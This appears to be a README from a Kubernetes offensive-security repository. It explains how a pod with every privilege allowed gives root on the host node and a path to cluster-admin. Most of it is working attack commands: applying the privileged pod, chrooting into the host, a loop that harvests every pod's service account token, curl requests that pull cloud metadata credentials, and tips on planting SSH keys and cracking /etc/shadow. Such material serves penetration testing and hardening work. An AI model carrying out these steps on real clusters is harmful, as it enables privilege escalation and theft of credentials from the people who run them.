# You can create a pod with all the things
If there are no pod admission controllers applied,or a really lax policy, you can create a pod that has complete access to the host node. You essentially have a root shell on the host, which provides a path to cluster-admin. 

[pod-everything-allowed.yaml](pod-everything-allowed.yaml)

### Create a pod
```bash
# Option 1: Create pod from local yaml 
kubectl apply -f pod-everything-allowed.yaml 
# Option 2: Create pod from github hosted yaml
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/yaml/everything-allowed/pod-everything-allowed.yaml 
```
### Exec into pod 
```bash
kubectl exec -it pod-everything-allowed -- chroot /host

```

### Post exploitation

You now have root access to the node. Here are some next steps: 

Look for kubeconfig's in the host filesystem (if you are lucky, you will find a cluster-admin config with full access to everything (not so lucky here on this GKE node)

```bash
find / -name kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/merged/var/lib/kube-proxy/kubeconfig
/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/var/lib/node-problem-detector/kubeconfig
/var/lib/kubelet/kubeconfig
/var/lib/kube-proxy/kubeconfig
/home/kubernetes/containerized_mounter/rootfs/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/docker/overlay2/e13d54160a660c0486276f54449e9d9d364aaa4c985a3b71010d8bc31e520838/diff/var/lib/kube-proxy/kubeconfig
/mnt/stateful_partition/var/lib/node-problem-detector/kubeconfig
/mnt/stateful_partition/var/lib/kubelet/kubeconfig
/mnt/stateful_partition/var/lib/kube-proxy/kubeconfig
```

Grab all tokens from all pods on the system and use something like access-matrix to see if any of them give you more permission than you currently have, mainly permissions to read all secrets in kube-system

```bash
# This lists the location of every service account used by every pod on the node you are on, and tells you the namespace. 
tokens=`find /var/lib/kubelet/pods/ -name token -type l`; for token in $tokens; do parent_dir="$(dirname "$token")"; namespace=`cat $parent_dir/namespace`; echo $namespace "|" $token ; done | sort

default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
default | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-t25ss/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
development | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/kube-proxy-token-x6j9x/token
kube-system | /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/calico-node-token-d426t/token


# For each interesting token, copy token value to somewhere you have kubectl set and see what permissions it has assigned to it
DTOKEN=`cat /var/lib/kubelet/pods/GUID/volumes/kubernetes.io~secret/default-token-qqgjc/token`
kubectl auth can-i --list --token=$DTOKEN -n development # Shows namespace specific permissions
kubectl auth can-i --list --token=$DTOKEN #Shows cluster wide permissions

# Does the token allow you to view secrets in that namespace? How about other namespaces?
# Does it allow you to create clusterrolebindings? Can you bind your user to cluster-admin?
```

If cloud hosted, look at the metadata service and checkout user-data, and the IAM permissions. If an IAM role has been assigned to the node, use that to see wht access you hav in the cloud environment. 

```bash
curl http://169.254.169.254/latest/user-data 
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/insce-accounts/default/token
```

Some other ideas:
* Add your public key to node and ssh to it
* Crack passwords in /etc/shadow, see if you can use them to access other nodes
* Look at the volumes that each of the pods have mounted. You might find some pretty sensitive stuff in there. 

   
## Reference(s)/Acknowledgements: 
* https://raesene.github.io/blog/2019/04/01/The-most-pointless-kubernetes-command-ever/
  